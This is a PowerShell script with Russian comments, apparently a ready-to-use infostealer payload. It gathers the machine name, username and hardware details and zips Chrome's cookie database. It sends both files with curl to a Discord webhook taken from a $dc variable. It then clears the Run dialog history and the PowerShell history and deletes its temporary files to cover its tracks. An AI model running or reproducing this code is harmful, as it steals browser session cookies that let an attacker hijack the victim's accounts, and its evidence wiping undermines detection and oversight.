############################################################################################################################################################

$ComputerName = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Name
$UserName = Get-ChildItem Env:UserName | Select-Object -ExpandProperty Value
$CoresCount = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
$ProcessorName = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
$GPUName = Get-WmiObject -Class Win32_VideoController | Select-Object -First 1 -ExpandProperty Name

$wifiProfiles = "Info PC $ComputerName" + "`n" + "Username: $UserName" + "`n" + "CPU: $ProcessorName" + "`n" + "Cores: $CoresCount" + "`n" + "GPU: $GPUName"

# Задайте переменную со списком файлов для архивации
$cookiesPath = "C:\Users\Towa\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
if (Test-Path $cookiesPath) {
    $cookiesFiles = Get-ChildItem -Path $cookiesPath -Filter *.* -Recurse | Select-Object -ExpandProperty FullName
    if ($cookiesFiles) {
        Compress-Archive -Path $cookiesFiles -DestinationPath "C:\Windows\Temp\cookies.zip" -Force
    } else {
        Write-Output "Нет файлов Cookies для архивирования."
    }
} else {
    Write-Output "Папка Cookies не найдена."
}

$wifiProfiles > "C:\Windows\Temp\info.txt"

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file
)

$hookurl = "$dc"

$files = @("C:\Windows\Temp\info.txt", "C:\Windows\Temp\cookies.zip")

$fileList = ''
$i = 1

foreach ($file in $files) {
    if (Test-Path $file) {
        # Файл существует, добавляем его в список для отправки с нумерацией
        $fileList += "-F `"file$i=@$file`" "
        $i = $i + 1
    } else {
        # Файл не существует, печатаем сообщение об ошибке
        Write-Output "Файл $file не найден."
    }
}

# Отправляем файлы используя cURL
if ($fileList) {
    $curlCommand = "curl.exe $fileList $hookurl"
    Invoke-Expression $curlCommand
} else {
    Write-Output "Нет файлов для отправки."
}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "C:\Windows\Temp\info.txt"}

 

# Очистить следы

function Clean-Exfil {

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

}

# Запустить скрипт очистки

Clean-Exfil

RI "C:\Windows\Temp\info.txt"
RI "C:\Windows\Temp\cookies.zip"
